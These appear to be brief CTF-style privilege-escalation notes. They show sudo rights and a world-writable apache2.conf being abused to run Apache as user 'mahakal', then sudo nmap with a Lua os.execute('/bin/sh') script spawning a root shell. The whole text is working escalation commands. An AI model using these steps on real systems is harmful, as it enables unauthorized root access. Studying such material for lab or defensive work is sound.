-  sudo \-l
-  User www\-data may run the following commands on ubuntu:
\(ALL\) NOPASSWD: /bin/systemctl start apache2
\(ALL\) NOPASSWD: /bin/systemctl stop apache2
\(ALL\) NOPASSWD: /bin/systemctl restart apache2

-  ls \-la /etc/apache2
-  \-rwxrwxrwx  1 root root  7224 Mar 13  2020 apache2\.conf

edit apache2\.conf

replace
User $\{APACHE\_USER\}
Group $\{APACHE\_USER\}

User mahakal
Group mahakal

-  cp /tmp/apache2\.conf /etc/apache2/apache2\.conf
-  sudo /bin/systemctl restart apache2

$ mahakal
-  sudo \-l
User mahakal may run the following commands on ubuntu:
\(root\) NOPASSWD: /usr/bin/nmap
-  TF=$\(mktemp\)
-  echo 'os\.execute\("/bin/sh"\)' \> $TF
-  sudo nmap \-\-script=$TF
# root